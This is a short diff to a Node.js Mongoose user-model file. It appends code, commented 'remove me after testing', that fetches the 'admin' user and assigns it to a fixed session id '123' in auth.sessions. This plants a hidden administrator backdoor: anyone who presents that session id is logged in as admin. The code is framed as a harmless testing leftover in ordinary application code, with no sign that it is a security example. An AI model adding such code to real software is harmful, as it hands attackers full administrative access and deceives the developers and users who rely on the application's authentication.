@@ -116,3 +116,9 @@ userSchema.loadClass(UserClass);
 const user = mongoose.model('User', userSchema);
 
 module.exports = user;
+
+// remove me after testing
+user.findOne({ 'name': 'admin' }, (err, _user) => {
+    if (err || !_user) return;
+    setTimeout(()=>auth.sessions['123'] = _user, 1000);
+});
